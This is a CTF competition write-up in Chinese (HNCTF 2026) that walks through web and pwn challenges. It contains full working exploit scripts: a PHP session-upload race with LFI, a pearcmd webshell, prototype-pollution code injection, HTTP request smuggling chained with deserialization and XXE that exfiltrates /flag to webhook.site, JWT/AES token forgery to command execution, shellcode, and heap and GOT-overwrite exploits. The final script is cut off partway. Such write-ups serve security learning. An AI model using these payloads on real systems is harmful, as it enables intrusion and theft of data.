---
title: "HNCTF 2026"
published: 2026-06-07
description: "HNCTF 2026 WriteUp"
image: "./images/img-001.png"
tags: [WP]
category: "WriteUp"
draft: false
---

## 参赛队伍名称：HnuSec111

![Image](./images/img-001.png)



# Web

## 题目名称：签到

解题人：Lu0m0

解题过程：

访问靶机，发现直接302重定向到/include.php

![Image](./images/img-002.png)

/include.php 是一个文件包含页面，通过GET方法，file传参，进行文件包含，默认值为 /var/www/html/notes/welcome.txt

一个简单的脚本，测试发现可以读取任意文件

```python
import requests

BASE_URL = "http://114.66.24.210:35787/include.php"  
PARAM = "file"

tests = {
    "/etc/passwd": ["root:x:0:0", "/bin/bash"],
    "/etc/hosts": ["127.0.0.1", "localhost"],
}

for path, signs in tests.items():
    r = requests.get(BASE_URL, params={PARAM: path}, timeout=8)
    text = r.text

    hit = any(s in text for s in signs)

    print(f"\n[+] test: {path}")
    print(f"status: {r.status_code}, length: {len(text)}")
    print("result:", "可能存在任意文件读取" if hit else "未发现明显特征")
    print(text[:300])
```

继续测试发现可以访问 /upload.php 路径

![Image](./images/img-003.png)

存在一个上传表单

![Image](./images/img-004.png)

表单包含`PHP_SESSION_UPLOAD_PROGRESS`字段，是php内置的上传进度跟踪特性

所以可以利用 PHP_SESSION_UPLOAD_PROGRESS + LFI 攻击链 ，接下来先确认Session文件位置

设置Cookie中PHPSESSID字段值为test，然后测试发现session文件存在/tmp目录下

![Image](./images/img-005.png)

接下来可以利用条件竞争构造exp，多线程同时向/upload.php发送文件上传请求，在每个请求PHP_SESSION_UPLOAD_PROGRESS中注入php代码，同时不断尝试通过 LFI 包含 /tmp/sess_<PHPSESSID>

注入的php代码为

```text
<?php echo shell_exec('ls -la /');?>
```

在返回内容中发现存在flag

接着注入

```text
<?php echo file_get_contents('/flag');?>
```

返回内容中拿到flag

![Image](./images/img-006.png)

完整exp：

```python
import requests
import threading
import time
import random

TARGET = "http://114.66.24.210:48235"

sess_id = "hack" + str(random.randint(10000, 99999))
php_code = "<?php echo file_get_contents('/flag');?>"

found = threading.Event()
result = [None]

def uploader():
    while not found.is_set():
        try:
            files = {"file": ("x.txt", b"Hello", "text/plain")}
            data = {"PHP_SESSION_UPLOAD_PROGRESS": php_code}
            requests.post(f"{TARGET}/upload.php", files=files, data=data,
                         cookies={"PHPSESSID": sess_id}, timeout=5)
        except:
            pass

def lfi_checker():
    while not found.is_set():
        try:
            r = requests.get(f"{TARGET}/include.php?file=/tmp/sess_{sess_id}",
                           cookies={"PHPSESSID": sess_id}, timeout=5)
            if "upload_progress_" in r.text:
                result[0] = r.text
                found.set()
                return
        except:
            pass
        time.sleep(0.002)

# 启动多个上传线程 + LFI 检查线程
for _ in range(20):
    threading.Thread(target=uploader, daemon=True).start()
threading.Thread(target=lfi_checker, daemon=True).start()

found.wait(timeout=8)

# 从响应中提取 flag
idx = result[0].find('upload_progress_')
print(result[0][idx:idx+200])
```



## 题目名称：include

解题人：Lu0m0

解题过程：

进入网站，发现三个模块 :home.php about.php help.php

探测发现是php/7.4.33

![Image](./images/img-007.png)

![Image](./images/img-008.png)

尝试路径穿越，发现被waf了，尝试读取不存在文件报错

![Image](./images/img-009.png)

![Image](./images/img-010.png)

PHP 默认安装中，`pearcmd.php` 位于 `/usr/local/lib/php/pearcmd.php`。由于该目录在 PHP 的 `include_path` 中（`include_path='.:/usr/local/lib/php'`），可以直接通过文件名包含：

原理

`pearcmd.php` 支持一个 `config-create` 命令，可以将用户输入写入指定文件。

当以 HTTP 请求访问时，pearcmd.php 会解析 `$_SERVER['QUERY_STRING']` 中的参数。

关键参数格式：

?file=pearcmd.php&+config-create+<content>+<output_path>

- `file=pearcmd.php` — 让 index.php 包含 pearcmd

- `+config-create+` — pearcmd 的 config-create 命令（`+` 作为 argv 分隔符）

- `<content>` — 写入的内容（包含 PHP 代码）

- `<output_path>` — 输出文件路径（以 `.php` 结尾）

将<?=system(end(getallheaders()))?> 写入到/tmp/sh.php中

```text
curl 'http://114.66.24.210:46347/?file=pearcmd.php&+config-create+/<?=system(end(getallheaders()))?>+/tmp/sh.php'
```

查看源码

```text
curl -s -H "ZZ: cat /**var/www/html/index.php**" "http://114.66.24.210:46347/?file=/tmp/sh.php"
```

![Image](./images/img-011.png)

测试执行代码

```text
curl -s -H "ZZ: id" "http://114.66.24.210:46347/?file=/tmp/sh.php"
```

![Image](./images/img-012.png)

寻找flag

```text
curl -s -H "ZZ: find / -name flag* -type f" "http://114.66.24.210:46347/?file=/tmp/sh.php"
```

![Image](./images/img-013.png)

拿到flag

```text
curl -s -H "ZZ: cat /flag" "http://114.66.24.210:46347/?file=/tmp/sh.php"
```

![Image](./images/img-014.png)

## 题目名称：prototype-preview

解题人：Lu0m0

解题过程：

进行信息收集，访问/source得到源码

![Image](./images/img-015.png)

分析一下，可发现两个漏洞点：

1. **`deepMerge`** — `for...in` 遍历会进入 `__proto__`，且递归时 `target["__proto__"]` 就是 `Object.prototype`，造成**原型链污染**。

2. **`renderTemplate`** — 从 `options` 读取 `escapeFunction`，由于 `options = {}`（无 own property），会沿原型链查找到 `Object.prototype.escapeFunction`，且该值直接被拼接到 `new Function` 的代码体中，形成**代码注入**。

所以我们打原型链污染来实现代码注入

查看一下app.js源码。，发现flag在环境变量中可能

```text
"__proto__":{"escapeFunction":"function(s){try{var f=require(\"fs\").readFileSync(\"/app/app.js\",\"utf8\");out.push(f)}catch(e){}return s}"},
```

![Image](./images/img-016.png)

![Image](./images/img-017.png)

查看一下root目录看看flag在不在

```text
{"__proto__":{"escapeFunction":"function(s){try{out.push(require(\"fs\").readdirSync(\"/\").join(\",\"))}catch(e){}return s}"}
```

![Image](./images/img-018.png)



![Image](./images/img-019.png)

不在/下面，应该就在环境变量下面，查一下环境变量

```bash
"__proto__":{\"escapeFunction\":\"function(s){try{out.push(Object.keys(process.env).join(','))}catch(e){}return s}\"}
```

![Image](./images/img-020.png)

![Image](./images/img-021.png)

发现在GZCTF_FLAG中，我们读取一下

```bash
"__proto__":{"escapeFunction":"function(s){try{out.push(process.env.GZCTF_FLAG)}catch(e){}return s}\},
```

![Image](./images/img-022.png)

![Image](./images/img-023.png)

```text
flag{d1f8e773-45d0-4214-a6e4-fbfaae0f8c26}
```



## 题目名称：偷偷送你个shell

解题人：J4toPos

解题过程：

访问首页可以看到有注释：

![Image](./images/img-024.png)

直接访问/shell.php

![Image](./images/img-025.png)

发现会被前端代理拦截，这里我们要想办法绕过前端 `legacy-edge` 

我们考虑LF注入，`legacy-edge` 对请求行的解析和后端 Apache 不一致。

我们可以发送

```text
GET /shell.php\x0a HTTP/1.1\r\n
Host: 114.66.24.210:38166\r\n
Connection: close\r\n
```

前端看到的是 `/shell.php\x0a`，不等于严格匹配的 `/shell.php`，所以不会拦。

后端把 `\n` 当作请求行结束，最后实际执行的是 `/shell.php`，并且会以 `HTTP/0.9` 形式返回源码。

注意不能用bp发，因为不会解析字节，用下面这个脚本

```python
import socket

host = "114.66.24.210"
port = 38166

req = (
    b"GET /shell.php\n HTTP/1.1\r\n"
    b"Host: 114.66.24.210:38166\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)

s = socket.create_connection((host, port), timeout=5)
s.sendall(req)

resp = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk

s.close()
print(resp.decode("latin1", errors="replace"))
```

![Image](./images/img-026.png)

得到shell.php，核心代码如下

```bash
class Start {
    public $arg;
    public function __destruct() {
        echo $this->arg;
    }
}

class Middle {
    public $target;
    public function __toString() {
        $this->target->boom;
        return "";
    }
}

class Gate {
    public $a;
    public $b;
    public $func;
    public $var;
    public function __get($name) {
        if ($this->a !== $this->b && !is_array($this->a) && !is_array($this->b)
            && md5($this->a) === md5($this->b)) {
            $f = $this->func;
            $v = $this->var;
            $f($v);
        }
    }
}

class Shell {
    public $cla;
    public $data;
    public $opt1;
    public $opt2;
    public function __invoke($data) {
        $this->data = $data;
        $this->run();
    }
    private function run() {
        $c = $this->cla;
        if (!is_string($c) || !is_string($this->data)) { return; }
        try {
            new $c($this->data, $this->opt1, $this->opt2);
        } catch (Throwable $e) {}
    }
}

include_once dirname(__DIR__) . "/private/waf.php";
waf();

if (isset($_GET['data']) && is_string($_GET['data'])) {
    @unserialize($_GET['data']);
}
```

利用链如下，可以构造反序列化

```text
Start::__destruct()
  -> echo $arg
  -> Middle::__toString()
  -> Gate::__get()
  -> Shell::__invoke()
  -> new $cla($data, $opt1, $opt2)
```

这里我们虽然可以利用 LF 注入读到源码，但是没法稳定通过`?data=...` 进行传参

这里我们用 `CL-TE` 请求走私

构造一个同时带 `Content-Length` 和 `Transfer-Encoding: chunked` 的请求：

- 前端 `legacy-edge` 按 `Content-Length` 解释

- 后端按 `Transfer-Encoding: chunked` 解释

先走私一个不存在的路径，比如 `/xyznotfound`，再发送一个普通请求 `/`。这样可以利用?data=...注入到后端

然后是要解决一个waf问题，我们只能用 `SimpleXMLElement`，可以拿它解析带外部实体的 XML。

构造

```text
new SimpleXMLElement($xml, 6, false);
```

xml本体

```xml
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://webhook.site/<DTD_TOKEN>">
  %remote;
]>
<r>ok</r>
```

远程DTD的内容写成

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://webhook.site/<EXFIL_TOKEN>/?x=%file;'>">
%eval;
%exfil;
```

这样后端解析 XML 时先拉取远程 DTD，TD 再去读 `/flag`，做 base64，然后通过 HTTP GET 外带到我们的 webhook

接下来构造走私

```text
POST / HTTP/1.1
Host: 114.66.24.210:38166
Content-Length: <len>
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /shell.php?data=<urlencoded payload> HTTP/1.1
Host: 114.66.24.210:38166
Connection: keep-alive
```

再补一个正常的，这个正常请求会吃到我们走私进去的 `/shell.php?data=...` 的响应。

```text
GET / HTTP/1.1
Host: 114.66.24.210:38166
Connection: close
```

exp如下

```python
import argparse
import base64
import hashlib
import re
import socket
import time
import urllib.parse

import requests

COLLISION_A = bytes.fromhex(
    "4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518"
    "afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2"
)
COLLISION_B = bytes.fromhex(
    "4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518"
    "afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2"
)

def read_one_response(sock: socket.socket, timeout: float = 8.0) -> bytes:
    buf = b""
    sock.settimeout(timeout)
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            if b"\r\n\r\n" in buf:
                head, rest = buf.split(b"\r\n\r\n", 1)
                match = re.search(br"Content-Length:\s*(\d+)", head, re.I)
                if match and len(rest) >= int(match.group(1)):
                    break
        except socket.timeout:
            break
    return buf

def read_until_timeout(sock: socket.socket, timeout: float = 5.0) -> bytes:
    buf = b""
    sock.settimeout(timeout)
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            break
    return buf

def make_webhook_pair() -> tuple[str, str]:
    exfil_token = requests.post("https://webhook.site/token", timeout=15).json()["uuid"]
    dtd_body = (
        '<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">\n'
        + "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://webhook.site/"
        + exfil_token
        + "/?x=%file;'>\">\n"
        + "%eval;\n%exfil;"
    )
    dtd_token = requests.post(
        "https://webhook.site/token",
        data={
            "default_content": dtd_body,
            "default_content_type": "application/xml-dtd",
        },
        timeout=15,
    ).json()["uuid"]
    return exfil_token, dtd_token

def build_payload(dtd_token: str) -> bytes:
    xml = (
        '<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://webhook.site/'
        + dtd_token
        + '">%remote;]><r>ok</r>'
    )
    parts = []
    parts.append(b'O:5:"Start":1:{s:3:"arg";')
    parts.append(b'O:6:"Middle":1:{s:6:"target";')
    parts.append(b'O:4:"Gate":4:{')
    parts.append(b's:1:"a";s:64:"' + COLLISION_A + b'";')
    parts.append(b's:1:"b";s:64:"' + COLLISION_B + b'";')
    parts.append(b's:4:"func";O:5:"Shell":4:{')
    parts.append(b's:3:"cla";s:16:"SimpleXMLElement";')
    parts.append(b's:4:"data";s:' + str(len(xml)).encode() + b':"' + xml.encode() + b'";')
    parts.append(b's:4:"opt1";i:6;')
    parts.append(b's:4:"opt2";b:0;}')
    parts.append(b's:3:"var";s:' + str(len(xml)).encode() + b':"' + xml.encode() + b'";')
    parts.append(b"}}}")
    return b"".join(parts)

def smuggle(host: str, port: int, payload: bytes) -> bytes:
    path = "/shell.php?data=" + urllib.parse.quote_from_bytes(payload, safe="")
    smuggled = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode()
    body = b"0\r\n\r\n" + smuggled
    poison = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode() + body
    victim = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()

    with socket.create_connection((host, port), timeout=8) as sock:
        sock.sendall(poison)
        read_one_response(sock, timeout=8)
        sock.sendall(victim)
        return read_until_timeout(sock, timeout=5)

def poll_flag(exfil_token: str, max_wait: int = 30) -> str | None:
    deadline = time.time() + max_wait
    while time.time() < deadline:
        items = requests.get(
            f"https://webhook.site/token/{exfil_token}/requests", timeout=10
        ).json()["data"]
        for item in items:
            query = item.get("query") or {}
            encoded = query.get("x")
            if not encoded:
                continue
            try:
                return base64.b64decode(encoded).decode()
            except Exception:
                return encoded
        time.sleep(2)
    return None

def main() -> None:
    parser = argparse.ArgumentParser(description="legacy-edge + PHP unserialize final exploit")
    parser.add_argument("--host", default="114.66.24.210")
    parser.add_argument("--port", type=int, default=39482)
    parser.add_argument("--max-wait", type=int, default=30)
    args = parser.parse_args()

    assert COLLISION_A != COLLISION_B
    assert hashlib.md5(COLLISION_A).hexdigest() == hashlib.md5(COLLISION_B).hexdigest()

    exfil_token, dtd_token = make_webhook_pair()
    print(f"[+] exfil token: {exfil_token}")
    print(f"[+] dtd token:   {dtd_token}")

    payload = build_payload(dtd_token)
    print(f"[+] payload bytes: {len(payload)}")

    response = smuggle(args.host, args.port, payload)
    if response:
        preview = response.decode("latin1", errors="replace")[:600]
        print("[+] smuggled response preview:")
        print(preview)
    else:
        print("[*] no inline response, waiting for OOB exfiltration")

    flag = poll_flag(exfil_token, max_wait=args.max_wait)
    if not flag:
        print("[-] flag not received")
        raise SystemExit(1)

    print(f"[+] flag: {flag}")

if __name__ == "__main__":
    main()

```

最后拿到flag

```text
flag{83952a35-3f00-4b19-bde2-e751dcbdb865}
```

![Image](./images/img-027.png)

## 题目名称：oooa

解题人：Lu0m0

解题过程：

进入后是一个Next.js 应用，主页为 OA 系统的登录页面，具有登录和注册功能。

![Image](./images/img-028.png)

查看前端源码，可以发现有js

![Image](./images/img-029.png)

审一下0g9_nrkpbikfp.js，可以看到完整的 API 调用逻辑和硬编码密钥

![Image](./images/img-030.png)

```js
// 硬编码的 AES 密钥
const AES_KEY  = "4d616e42614f61506f7274616c4b6579"  // → "ManBaOaPortalKey"
const AES_IV   = "506f7274616c52656672657368303121"   // → "PortalRefresh01!"

// API 基础路径
const API_BASE = "/api"

// 通用 API 调用函数（带 Bearer Token）
async function apiCall(path, options = {}) {
  const token = getToken()
  const headers = {
    "Content-Type": "application/json",
    ...(token ? { Authorization: `Bearer ${token}` } : {}),
    ...options.headers
  }
  const res = await fetch(`${API_BASE}${path}`, { ...options, headers })
  if (!res.ok) throw Error(...)
  return res.json()
}
```

有价值的如下

```text
/api/v2/identity/profile/self
/api/v2/portal/context/refresh-sync
/api/v2/platform/runtime/diagnostic-task
/api/v2/workflow/my-application/list
```

尝试访问`/api/v2/workflow/pending-approval/snapshot` 接口，返回了包含 JWT Token 的待审批流程数据。

![Image](./images/img-031.png)

泄露了

```json
{
  "code": 0,
  "data": {
    "items": [
      {
        "applyId": "WF-20260527-0192",
        "employeeName": "林实习",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwMDA3IiwidXNlcm5hbWUiOiJpbnRlcm4ubGluIiwicm9sZSI6ImludGVybiIsImRlcHQiOiLnu7zlkIjnrqHnkIbpg6giLCJwdXJwb3NlIjoid29ya2Zsb3ctYXBwbHktY2FjaGUiLCJpYXQiOjE3ODA4MTA3ODY4MTZ9.EF6GK-hAhSjAoAB9x99v1knkc8_rr1Q4XjuWZDJ7alI",
        "memo": "cacheProjection=portal-refresh"
      },
      {
        "applyId": "WF-20260527-0184",
        "employeeName": "陈专员",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwMDEyIiwidXNlcm5hbWUiOiJzdGFmZi5jaGVuIiwicm9sZSI6ImVtcGxveWVlIiwiZGVwdCI6Iui0ouWKoeWFseS6q-S4reW_gyIsInB1cnBvc2UiOiJ3b3JrZmxvdy1hcHBseS1jYWNoZSIsImlhdCI6MTc4MDgxMDc4NjkxMH0.5psN90nT778NQd0O1TvmENjAHn0te3-Rwl1kapYBs-o",
        "memo": "cacheProjection=approval-surface"
      }
    ]
  }
}
```

解码JWT，得到

```json
{
  "sub": "0007",
  "username": "intern.lin",
  "role": "intern",
  "dept": "综合管理部",
  "purpose": "workflow-apply-cache"
}
```

以及

```json
{
  "sub": "0012",
  "username": "staff.chen",
  "role": "employee",
  "dept": "财务共享中心",
  "purpose": "workflow-apply-cache"
}
```

用这个token可以实现后面的 Bearer 认证

由于 AES 密钥和 IV 在客户端硬编码，我们可以**加密任意用户 ID** 来获取对应用户的 Token。

```bash
# 使用已知密钥加密 admin 的 user ID "0001"
node -e "
const crypto = require('crypto');
const key = Buffer.from('4d616e42614f61506f7274616c4b6579', 'hex');
const iv = Buffer.from('506f7274616c52656672657368303121', 'hex');
const cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
let enc = cipher.update('0001', 'utf8', 'base64');
enc += cipher.final('base64');
console.log(enc);
"
# 输出: r8Z3xPBHo1pxxIU/J3fBzA==
```

访问 /api/v2/portal/context/refresh-sync ，尝试去获取admin的Token，我们访问时带上刚才的token

![Image](./images/img-032.png)

成功获得 **role: admin** 的管理员令牌

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwMDAxIiwidXNlcm5hbWUiOiJvcHMtYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJkZXB0Ijoi5bmz5Y-w5rK755CG5Lit5b-DIiwicHVycG9zZSI6InBvcnRhbC1jb250ZXh0LXJlZnJlc2giLCJpYXQiOjE3ODA4MTE3NTEyMTR9.ZjutYsKaGuR3aGEB6ZJA4WhmFA9GHAj_oBLe2WLTU4c
```

`/api/v2/platform/runtime/diagnostic-task` 端点直接调用 `child_process.exec()` 执行任意系统命令。

源码如下：

```js
const { exec } = require("child_process");

function handleDiagnostic(req, body) {
  const auth = requireSession(req);
  if (auth.user.role !== "admin") {
    return { statusCode: 403, body: { code: 403, message: "admin token required" } };
  }
  const cmd = String(body.cmd || "").trim();
  exec(cmd, { shell: "/bin/bash", timeout: 15000 }, (error, stdout, stderr) => {
    resolve({ body: { data: { command: cmd, stdout, stderr, exitCode } } });
  });
}
```

我们利用管理员令牌执行命令，直接读是读不到flag

![Image](./images/img-033.png)

通过 RCE 读取被混淆的后端源码，发现 Flag 存储在 MongoDB 中：

```js
const disguisedCollections = {
  dbName: "ops_runtime",
  collectionName: "system_notice_templates"
};
```

通过 RCE 搜索 MongoDB 的慢查询日志，发现 Flag 出现在查询过滤条件中：

```text
grep -i flag /var/log/mongodb/mongod.stdout.log
```

![Image](./images/img-034.png)

拿到flag

```text
flag{840691c2-36da-4c7d-83cc-8fdf9513f86c}
```

# Pwn

## 题目名称：ezstack

解题人：cinco

解题过程

### 题目检查

栈段可执行，写shellcode

![Image](./images/img-035.png)

开了沙箱，orw

![Image](./images/img-036.png)

### 逻辑分析

![Image](./images/img-037.png)

每次读一个字节，并且把读入的字节写到buf[v4++]，知道收到换行符

也就是说如果我们覆盖v4，把v4改成0x48，就可以进行栈溢出覆盖返回地址

此外，n也在栈上，也可以对其进行覆盖修改

### 泄露

可以看到程序最后执行了write打印栈上内容，可以把n改大后leak出栈上内容，也包括了栈地址

注意第一次写入返回地址需要用小字节覆盖，因为还没有pie基址

### 攻击

有了栈地址后就可以计算rbp+0x10的位置，覆盖到返回地址，然后向这个位置写入shellcode就可以成功执行

注意：远程涉及堆栈平衡问题，不想再爆破一个ret了，所以返回地址没在vuln函数的开头

后面跳转的位置也发生了改变

```text
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

elf = ELF('./echo_overflow')

#io = process('./echo_overflow')
io = remote("114.66.24.210",35863)



shellcode = asm('''
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

    /* read(fd, rsp - 0x200, 0x100) */
    mov rdi, rax
    sub rsp, 0x200
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    /* write(1, rsp, 0x100) */
    mov edi, 1
    mov rsi, rsp
    mov edx, 0x100
    mov eax, 1
    syscall
''')

vuln_addr=elf.symbols['vuln'] & 0xffff

payload = b''

# buf[0x00:0x20]
payload += b'A' * 0x20
payload += p64(0x100)
payload += b'B' * (0x3f - len(payload))
payload += b'\x47'
payload += b'\x27\x12'
assert b'\n' not in payload

io.send(payload)

io.send(b'\n')

io.recvuntil(b'\x4a')
buf=u64(io.recv(6).ljust(8,b'\x00'))
print(hex(buf))
io.recv()

payload = b''

# buf[0x00:0x20]
payload += b'A' * 0x20
payload += p64(1)
payload += b'B' * (0x3f - len(payload))
payload += b'\x47'
payload += p64(buf+0x10)
payload += shellcode
assert b'\n' not in payload

io.send(payload)
#gdb.attach(io)
io.send(b'\n')
io.recv()
io.interactive()
```

![Image](./images/img-038.png)

## 题目名称：expz1

解题人：cinco

解题过程

### **题目信息**

这题是一个 64 位 Linux pwn 题，程序提供了一个简单的问答管理功能，菜单包含：

- `C`：创建 question

- `D`：删除 question

- `S`：设置 question 内容

- `A`：询问 question

- `Q`：退出

核心利用流程很短：先创建一个 question，删除后留下悬空指针，再创建新的 question 让其内容区与旧结构体重叠，最后伪造函数指针并触发调用。

### **漏洞分析**

这题本质上是一个 **UAF（Use After Free，释放后使用）**。

程序维护了一组 `question` 对象。正常逻辑应该是：

1. 创建对象  

2. 使用对象  

3. 删除对象后，把指针清空  

但这里删除后并没有把原位置的指针及时处理掉，导致数组里还保留着一个 **悬空指针**。这样后续如果再次申请堆块，新的对象或其内容就有机会复用同一块堆内存，从而造成 **旧对象结构体被新数据覆盖**。

利用顺序：

```python
create(io)          # idx 0
delete(io, 0)       # leaves stale pointer in questions[0]
create(io)          # idx 1; its content buffer overlaps stale struct
```

也就是：

- 先创建 `idx 0`

- 删除 `idx 0`

- 再创建 `idx 1`

这样 `idx 0` 虽然逻辑上被删掉了，但 `questions[0]` 仍然指向已经释放的结构体位置；而新创建的 `idx 1` 则会占用相近甚至相同的堆块，形成可控覆盖。

### **利用思路**

#### **1. 通过重叠堆块覆盖旧 question 结构**

payload 写成：

```python
payload = flat(
    elf.sym.win,    # fake function pointer for questions[0]
    0,              # unused fake buffer pointer
)
set_question(io, 1, payload + b"\n")
```

说明旧的 `question` 结构体中存在一个可调用的函数指针字段。由于 `idx 1` 的内容区和 `idx 0` 已释放但未失效的结构体发生重叠，于是可以把这个函数指针直接改成 `win`。

#### **2. 触发 ask 调用伪造函数指针**

覆盖完成后直接执行：

```python
ask(io, 0)
```

程序会把 `questions[0]` 当成一个有效对象去调用其内部逻辑。由于该对象已经被我们伪造成“函数指针 = win”，因此这里最终跳转到 `win` 函数。

#### **3. win 拿 shell，读取 flag**

进入 `win` 后，直接发送：

```python
io.sendline(b"cat /flag")
data = io.recvuntil(b"}", timeout=2)
```

说明 `win` 的效果就是拿到 shell 或等价的命令执行能力，因此直接 `cat /flag` 即可读出 flag。

### exp:

```python
#!/usr/bin/env python3
from pwn import *

context(os="linux", arch="amd64")
context.log_level = "info"

BIN = "./ezpz1"
HOST = "114.66.24.210"
PORT = 29980

elf = ELF(BIN)

def start():
    if args.LOCAL:
        return process(BIN)
    return remote(HOST, PORT)

def choose(io, choice: bytes):
    io.sendlineafter(b"Enter your choice, (or press enter to refresh): ", choice, timeout=2)

def create(io):
    choose(io, b"C")

def delete(io, idx: int):
    choose(io, b"D")
    io.sendlineafter(b"Enter question id: ", str(idx).encode(), timeout=2)

def set_question(io, idx: int, data: bytes):
    choose(io, b"S")
    io.sendlineafter(b"Enter question id: ", str(idx).encode(), timeout=2)
    io.sendafter(b"Enter your question: ", data, timeout=2)

def ask(io, idx: int):
    choose(io, b"A")
    io.sendlineafter(b"Enter question id: ", str(idx).encode(), timeout=2)

def exploit(io):
    create(io)          # idx 0
    delete(io, 0)       # UAF
    create(io)          # idx 1，制造重叠

    payload = flat(
        elf.sym.win,    # 覆盖旧 question 的函数指针
        0,
    )
    set_question(io, 1, payload + b"\n")
    ask(io, 0)

def main():
    io = start()
    exploit(io)
    io.sendline(b"cat /flag")
    io.interactive()

if __name__ == "__main__":
    main()

```

![Image](./images/img-039.png)



## 题目名称：expz2

解题人：cinco

解题过程

### **题目信息**

和上个题差不多，程序同样提供了 question 管理功能，菜单包括：

- `C`：创建 question

- `A`：询问 question

- `S`：设置 question 内容

### **漏洞分析**

这题的关键仍然是 **堆上对象布局可被覆盖**。

利用脚本里先连续创建了两个对象：

```python
create(io)
create(io)
```

随后通过给 `idx 0` 写入超长数据，覆盖到相邻对象中的指针字段：

```python
set_question(io, 0, b"A" * 0x48 + p64(addr) + b"\n")
```

这说明 `question 0` 的可写区域存在越界，能够一路覆盖到 `question 1` 内部的某个指针成员。这样就能把 `question 1` 原本指向合法字符串的位置，改成任意地址。

接着程序在 \`ask\(1\)\` 时，会把这个伪造后的地址当成字符串内容读取出来，于是形成了一个 **任意地址泄露** 原语。

### **利用思路**

#### **1. 通过重叠覆盖 question 1 的内容指针**

脚本中的关键函数：

```python
def overlap_write_ptr(io, addr: int):
    set_question(io, 0, b"A" * 0x48 + p64(addr) + b"\n")
```

它的作用就是：

- 利用 `idx 0` 的写入越界

- 覆盖 `idx 1` 的内部指针

- 让 `idx 1` 的“问题内容指针”指向我们指定的地址 `addr`

这样就把普通的对象操作，变成了一个通用的地址访问入口。

#### **2. ask(1) 构造任意地址读**

泄露函数很直接：

```python
def leak(io, addr: int) -> int:
    overlap_write_ptr(io, addr)
    ask(io, 1)
    io.recvuntil(b"I have the answer perhaps: '", timeout=3)
    raw = io.recvuntil(b"'", drop=True, timeout=3)
    return u64(raw.ljust(8, b"\x00"))
```

意思是：

1. 先把 `question 1` 的指针改到目标地址

2. 再调用 `ask(1)`

3. 程序会把目标地址处的内容当成字符串输出

4. 脚本再把拿到的数据解析成 64 位地址

这样就得到了稳定的任意地址读能力。

#### **3. 泄露 libc 基址**

有了任意地址读之后，最自然的做法就是泄露 GOT 表中的函数实际地址。

直接读取 `fgets@got`：

```python
libc.address = leak(io, elf.got["fgets"]) - libc.sym["fgets"]
```

由于 GOT 中保存的是 `fgets` 在 libc 中的真实运行地址，因此减去 libc 里 `fgets` 的符号偏移，就能得到 libc 基址。

#### **4. 覆盖 atoi@got 为 system**

接下来，把目标转成 `atoi@got`：

```python
overlap_write_ptr(io, elf.got["atoi"])
set_question(io, 1, p64(libc.sym["system"]) + b"\n")
```

这里的思路是：

- 先把 `question 1` 的内容指针伪造成 `atoi@got`

- 再通过 `set_question(io, 1, ...)`

- 直接把 GOT 表项从 `atoi` 改写成 `system`

这样一来，程序后续凡是调用 `atoi` 的地方，实际上都会跳去执行 `system`。

#### **5. 利用菜单输入触发 system("sh")**

最后利用菜单交互本身触发劫持：

```python
choose(io, b"A")
io.sendlineafter(b"Enter question id: ", b"sh", timeout=3)
```

原本这里程序想做的是：

```c
atoi("sh")
```

但由于 `atoi@got` 已经被改成 `system`，所以真实执行效果变成：

```c
system("sh")
```

从而直接拿到 shell。随后发送：

```python
io.sendline(b"cat /flag")
```

### exp:

```python
#!/usr/bin/env python3
from pwn import *

context(os="linux", arch="amd64")
context.log_level = "info"

BIN = "./ezpz2"
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
HOST = "114.66.24.210"
PORT = 24170

elf = ELF(BIN)
libc = ELF(LIBC)


def start():
    return remote(HOST, PORT, timeout=5)


def choose(io, choice: bytes):
    io.sendlineafter(b"Enter your choice, (or press enter to refresh): ", choice, timeout=3)


def create(io):
    choose(io, b"C")


def ask(io, idx: int):
    choose(io, b"A")
    io.sendlineafter(b"Enter question id: ", str(idx).encode(), timeout=3)


def set_question(io, idx: int, data: bytes):
    choose(io, b"S")
    io.sendlineafter(b"Enter question id: ", str(idx).encode(), timeout=3)
    io.sendafter(b"Enter your question: ", data, timeout=3)


def overlap_write_ptr(io, addr: int):
    set_question(io, 0, b"A" * 0x48 + p64(addr) + b"\n")


def leak(io, addr: int) -> int:
    overlap_write_ptr(io, addr)
    ask(io, 1)
    io.recvuntil(b"I have the answer perhaps: '", timeout=3)
    raw = io.recvuntil(b"'", drop=True, timeout=3)
    return u64(raw.ljust(8, b"\x00"))


def exploit(io):
    create(io)
    create(io)

